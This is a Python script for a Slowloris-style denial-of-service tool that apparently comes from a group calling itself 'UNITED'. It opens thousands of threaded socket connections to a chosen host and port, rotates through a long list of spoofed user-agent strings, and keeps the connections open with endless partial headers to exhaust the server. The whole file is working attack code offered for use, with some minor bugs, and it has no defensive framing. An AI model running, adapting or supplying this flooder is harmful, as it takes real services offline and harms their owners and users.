
import socket
import random
import threading
import sys, os , time

def UNITED(threads, host, port, mode):
    
    print("\nFlooding << HOST: %s PORT: %s METHOD: %s >> with %s threads" %(host, port, mode, threads))
    time.sleep(5)   
    
    def useragent_list():

        headers_useragents = []
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
        headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
        headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
        headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
        headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
        headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
        headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
        headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
        headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
        headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
        headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
        headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
        headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
        headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
        headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
        headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
        headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
        headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
        headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
        headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
        headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
        headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
        headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
        headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
        headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
        headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
        return(headers_useragents)

    def sendPacket():

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        headers_useragents = useragent_list()
        
        try:
            sock.connect((host, port))
        except socket.error:
            print("[-] Server is unresponsive maybe down?")

        sock.send("GET /? WE_ARE_UNITED_POIOSN_SEC HTTP/1.1\r\n".encode("utf-8"))
        sock.send("User-Agent: {}\r\n".format(random.choice(headers_useragents)).encode("utf-8"))
        sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

        return sock

    def unitedAttack():
        #host = host
        #port = port
        total_packets = []
        for _ in range(6000):
            try:
                
                print("[-] Flooding server << HOST: %s PORT: %s >> with packets: %s" %(host, port, _))
                sock = sendPacket()

            except socket.error:
                print("[-] Server is unresponsive, maybe down? ")
                break

            except KeyboardInterrupt:

                print("\n[-] System collapsed.")
                sys.exit()
            total_packets.append(sock)

        while True:
            try:

                for sock in list(total_packets):
                    try:
                        sock.send(
                            "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                        )
                    except socket.error:
                        total_packets.remove(s)

                for _ in range(60000 - len(total_packets)):
                    print("[-] Re-creating packet")
                    try:
                        sock = sendPacket()
                        if sock:
                            total_packets.append(sock)
                    except socket.error as e:
                        print(f"[-] {e}")
                        break
                print("[-] Re-connecting to the server")
                time.sleep(2)

            except (KeyboardInterrupt, SystemExit):
                print("\n[-] SYstem collapsed. Cannot resolved the problem")
                sys.exit()
    thread_list = []
    for thread in range(threads):
        t = threading.Thread(target=unitedAttack)
        t.start()
        thread_list.append(t)
    for i in thread_list:
        i.join()
